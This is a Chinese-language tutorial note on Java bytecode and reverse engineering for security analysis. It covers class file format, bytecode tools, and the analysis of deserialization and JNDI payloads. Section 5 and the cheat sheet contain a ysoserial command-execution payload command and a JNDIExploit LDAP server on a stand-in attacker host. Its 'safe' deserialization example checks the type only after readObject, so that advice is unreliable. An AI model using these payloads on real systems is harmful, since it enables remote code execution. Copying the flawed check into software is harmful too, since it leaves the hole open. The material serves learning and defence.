# Java 字节码深入分析

> 字节码是 Java 安全分析的核心。理解字节码结构和指令集，才能识别混淆代码、分析恶意 Payload、
> 找到反序列化漏洞的利用点。

> **前置知识**：[[01-Java逆向工程与安全分析|Java 逆向工程基础]]、[[../../java/2深入/06_JVM内存模型|JVM 内存模型]]

---

## 一、Class 文件结构

### 1.1 二进制格式

```text
ClassFile {
    u4             magic;           // 魔数: 0xCAFEBABE
    u2             minor_version;   // 次版本号
    u2             major_version;   // 主版本号
    u2             constant_pool_count; // 常量池计数
    cp_info        constant_pool[]; // 常量池
    u2             access_flags;    // 访问标志
    u2             this_class;      // 当前类索引
    u2             super_class;     // 父类索引
    u2             interfaces_count; // 接口计数
    u2             interfaces[];    // 接口索引
    u2             fields_count;    // 字段计数
    field_info     fields[];        // 字段表
    u2             methods_count;   // 方法计数
    method_info    methods[];       // 方法表
    u2             attributes_count; // 属性计数
    attribute_info attributes[];    // 属性表
}
```

### 1.2 使用 xxd 分析 Class 文件

```bash
# 查看 class 文件十六进制
xxd MyClass.class | head -20

# 验证魔数
xxd -l 4 MyClass.class
# 00000000: cafe babe 0000 0034 ...
#           ^^^^^^^^ 魔数

# 查看版本号
xxd -s 4 -l 2 MyClass.class
# 00000004: 0000 0034
#           ^^^^^^ major version 52 (Java 8)
```

### 1.3 版本号对照

| 主版本号 | Java 版本 |
|---------|----------|
| 45 | Java 1.1 |
| 46 | Java 1.2 |
| 47 | Java 1.3 |
| 48 | Java 1.4 |
| 49 | Java 5 |
| 50 | Java 6 |
| 51 | Java 7 |
| 52 | Java 8 |
| 53 | Java 9 |
| 54 | Java 10 |
| 55 | Java 11 |
| 56 | Java 12 |
| 57 | Java 13 |
| 58 | Java 14 |
| 59 | Java 15 |
| 60 | Java 16 |
| 61 | Java 17 |
| 62 | Java 18 |
| 63 | Java 19 |
| 64 | Java 20 |
| 65 | Java 21 |

---

## 二、常量池详解

### 2.1 常量类型

| 标志 | 类型 | 说明 |
|------|------|------|
| 1 | CONSTANT_Utf8 | UTF-8 编码字符串 |
| 3 | CONSTANT_Integer | 整型字面量 |
| 4 | CONSTANT_Float | 浮点字面量 |
| 5 | CONSTANT_Long | 长整型字面量 |
| 6 | CONSTANT_Double | 双精度字面量 |
| 7 | CONSTANT_Class | 类或接口符号引用 |
| 8 | CONSTANT_String | 字符串字面量 |
| 9 | CONSTANT_Fieldref | 字段符号引用 |
| 10 | CONSTANT_Methodref | 方法符号引用 |
| 11 | CONSTANT_InterfaceMethodref | 接口方法符号引用 |
| 12 | CONSTANT_NameAndType | 名称和类型描述符 |
| 15 | CONSTANT_MethodHandle | 方法句柄 |
| 16 | CONSTANT_MethodType | 方法类型 |
| 18 | CONSTANT_InvokeDynamic | 动态调用点 |

### 2.2 字符串加密检测

```java
// 混淆前
String password = "secret123";

// 混淆后（字符串加密）
String password = a.b.c.a("7x8y9z");
// 常量池中只有加密后的字符串
```

```bash
# 检测方法：查看常量池中的字符串
javap -verbose MyClass.class | grep "String"
# 如果看到不合理的字符串，可能是加密后的
```

---

## 三、方法分析

### 3.1 方法表结构

```text
method_info {
    u2             access_flags;    // 访问标志
    u2             name_index;      // 方法名索引
    u2             descriptor_index; // 描述符索引
    u2             attributes_count; // 属性计数
    attribute_info attributes[];    // 属性表
}
```

### 3.2 Code 属性

```text
Code_attribute {
    u2 attribute_name_index;    // "Code"
    u4 attribute_length;
    u2 max_stack;               // 操作数栈最大深度
    u2 max_locals;              // 局部变量表大小
    u4 code_length;             // 字节码长度
    u1 code[];                  // 字节码指令
    u2 exception_table_length;  // 异常表长度
    exception_table_entry exception_table[];
    u2 attributes_count;
    attribute_info attributes[];
}
```

### 3.3 使用 ASM 动态分析方法

```java
import org.objectweb.asm.*;

public class MethodTracer {
    public static void main(String[] args) throws Exception {
        ClassReader cr = new ClassReader("com.example.service.UserService");
        ClassWriter cw = new ClassWriter(0);
        
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
            @Override
            public MethodVisitor visitMethod(int access, String name, 
                    String desc, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
                return new MethodVisitor(Opcodes.ASM9, mv) {
                    @Override
                    public void visitCode() {
                        // 在方法入口插入日志
                        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", 
                            "out", "Ljava/io/PrintStream;");
                        mv.visitLdcInsn("[TRACE] Entering: " + name);
                        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, 
                            "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
                        super.visitCode();
                    }
                };
            }
        };
        
        cr.accept(cv, 0);
        byte[] modifiedClass = cw.toByteArray();
        // 保存或加载修改后的类
    }
}
```

---

## 四、动态分析技术

### 4.1 Java Agent 字节码注入

```java
import java.lang.instrument.*;

public class MyAgent {
    public static void premain(String args, Instrumentation inst) {
        inst.addTransformer(new ClassFileTransformer() {
            @Override
            public byte[] transform(ClassLoader loader, String className,
                    Class<?> classBeingRedefined,
                    ProtectionDomain protectionDomain,
                    byte[] classfileBuffer) {
                if (className.contains("UserService")) {
                    System.out.println("[AGENT] Transforming: " + className);
                    // 在这里修改字节码
                    return modifiedBytes;
                }
                return null;
            }
        });
    }
}
```

```bash
# 使用 Agent
java -javaagent:myagent.jar -jar app.jar

# MANIFEST.MF 配置
Premain-Class: com.example.MyAgent
Can-Redefine-Classes: true
```

### 4.2 使用 Arthas 在线诊断

```bash
# 启动 Arthas
java -jar arthas-boot.jar

# 查看类加载信息
sc -d com.example.service.UserService

# 反编译正在运行的类
jad com.example.service.UserService

# 监控方法调用
watch com.example.service.UserService login '{params, returnObj}' -x 2

# 追踪方法调用栈
trace com.example.service.UserService login

# 查看方法执行时间
monitor com.example.service.UserService login -c 5
```

### 4.3 使用 Javassist 修改字节码

```java
import javassist.*;

public class BytecodeModifier {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get("com.example.service.UserService");
        
        // 添加方法
        CtMethod method = CtMethod.make(
            "public void logAccess(String user) {" +
            "  System.out.println(\"Access: \" + user);" +
            "}", cc);
        cc.addMethod(method);
        
        // 修改现有方法
        CtMethod login = cc.getDeclaredMethod("login");
        login.insertBefore(
            "System.out.println(\"Login attempt: \" + $1);"
        );
        
        cc.writeFile("./modified/");
    }
}
```

---

## 五、实战：分析恶意 Java Payload

### 5.1 分析 ysoserial 生成的 Payload

```bash
# 生成 CommonsCollections1 payload
java -jar ysoserial-all.jar CommonsCollections1 "id" > payload.bin

# 查看 payload 中的类
javap -c payload.bin 2>/dev/null || echo "不是标准 class 文件"

# 使用 Jadx 分析
jadx -d ./payload_analysis payload.bin

# 查找关键调用链
grep -r "Runtime.exec\|ProcessBuilder" ./payload_analysis/
```

### 5.2 识别反序列化入口点

```java
// 搜索代码中的 ObjectInputStream 使用
// 危险模式：
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // ← 这里是入口点

// 安全模式：
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();
if (obj instanceof SafeClass) {  // ← 类型检查
    process((SafeClass) obj);
}
```

### 5.3 使用 JNDIExploit 分析 JNDI 注入

```bash
# 启动 LDAP/RMI 服务
java -jar JNDIExploit.jar -i attacker-ip -l 1389

# 目标触发 JNDI 查找
# ldap://attacker-ip:1389/Basic/Command/calc

# 分析流程：
# 1. 目标应用收到恶意 JNDI URL
# 2. LDAP 服务返回引用，指向远程类
# 3. 目标 JVM 加载并实例化远程类
# 4. 静态代码块执行（通常是命令执行）
```

---

## 六、字节码分析速查

| 操作 | 工具/命令 |
|------|----------|
| 查看 class 结构 | `javap -verbose MyClass.class` |
| 反编译整个 jar | `java -jar cfr.jar app.jar` |
| 查看十六进制 | `xxd MyClass.class` |
| 动态 Hook | `frida -U -l hook.js app` |
| 在线诊断 | `arthas-boot.jar` |
| 生成 Payload | `java -jar ysoserial-all.jar CommonsCollections1 "cmd"` |
| 字节码操作 | ASM / Javassist / ByteBuddy |
| Android 反编译 | `jadx app.apk` |

---

## 七、与 Java 主教程的关联

| 本章主题 | Java 主教程章节 |
|---------|----------------|
| Class 文件格式 | [[../../java/2深入/06_JVM内存模型]] |
| 常量池 | [[../../java/2深入/06_JVM内存模型]] |
| 字节码指令 | [[../../java/2深入/06_JVM内存模型]] |
| 类加载器 | [[../../java/2深入/02_注解与反射]] |
| 反射机制 | [[../../java/2深入/02_注解与反射]] |
| 序列化 | [[../../java/1入门/17_文件IO]] |

> **深入建议**：字节码分析是逆向工程的基础技能。建议配合 [[../../java/2深入/06_JVM内存模型|JVM 内存模型]] 一起学习，
> 理解字节码如何映射到 JVM 的执行引擎。
